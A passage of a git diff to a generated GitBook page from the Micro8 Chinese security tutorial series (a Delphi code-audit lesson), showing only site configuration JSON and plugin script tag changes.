fa-hand-o-right","showLevelIcon":true},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"theme-comscore":{},"github-buttons":{"buttons":[{"user":"micro8","repo":"Micro8-HTML","type":"star","size":"small","count":true}]},"expandable-chapters-small":{},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/3_Delphi代码审计--项目实战1.md","mtime":"2019-02-23T03:06:57.244Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-01T13:38:56.930Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第三课：Delphi代码审计--项目实战1","level":"1.4.3","depth":2,"next":{"title":"第四课：Asp代码审计--项目实战2","level":"1.4.4","depth":2,"path":"Chapter1/4_Asp代码审计--项目实战2.md","ref":"Chapter1/4_Asp代码审计--项目实战2.md","articles":[]},"previous":{"title":"第二课：Linux提权-依赖exp篇","level":"1.4.2","depth":2,"path":"Chapter1/2_Linux提权-依赖exp篇.md","ref":"Chapter1/2_Linux提权-依赖exp篇.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","sharing","expandable-chapters-small","theme-comscore","splitter","github-buttons","page-footer-ex","anchors","anchor-navigation-ex","donate","terminal","ad","baidu-tongji","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prism-themes/themes/prism-atom-dark.css"]},"ad":{"contentBottom":"","contentTop":"<font size=\"6\"> 专注 APT 攻击与防御 </font>"},"baidu-tongji":{"url":"https://hm.baidu.com/hm.js","token":"b03e1a3682665e9218213dc9e1b5a428"},"page-footer-ex":{"copyright":"Copyright © 2019 Micro8. All Rights Reserved. 遵循 [知识共享 署名-非商业性使用 4.0 协议发布](https://creativecommons.org/licenses/by-nc/4.0/deed.zh)","markdown":true,"update_format":"YYYY-MM-DD","update_label":"修订时间："},"splitter":{},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-anchor","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":true},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"theme-comscore":{},"github-buttons":{"buttons":[{"user":"micro8","repo":"Micro8-HTML","type":"star","size":"small","count":true}]},"expandable-chapters-small":{},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"all":["facebook","google","twitter","weibo","instapaper"],"facebook":true,"google":false,"instapaper":false,"twitter":true,"vk":false,"weibo":false},"terminal":{"copyButtons":true,"fade":false,"style":"flat"},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/3_Delphi代码审计--项目实战1.md","mtime":"2019-03-03T09:03:45.123Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-03T11:03:03.040Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1987,7 +2011,7 @@ Procedure&#x7C7B;&#x4F3C;C&#x8BED;&#x8A00;&#x4E2D;&#x7684;&#x65E0;&#x8FD4;&#x56D
         
     
         
-        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
         
     
         
@@ -2004,6 +2028,10 @@ Procedure&#x7C7B;&#x4F3C;C&#x8BED;&#x8A00;&#x4E2D;&#x7684;&#x65E0;&#x8FD4;&#x56D
     
         
         <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-terminal/plugin.js"></script>
         
     
         
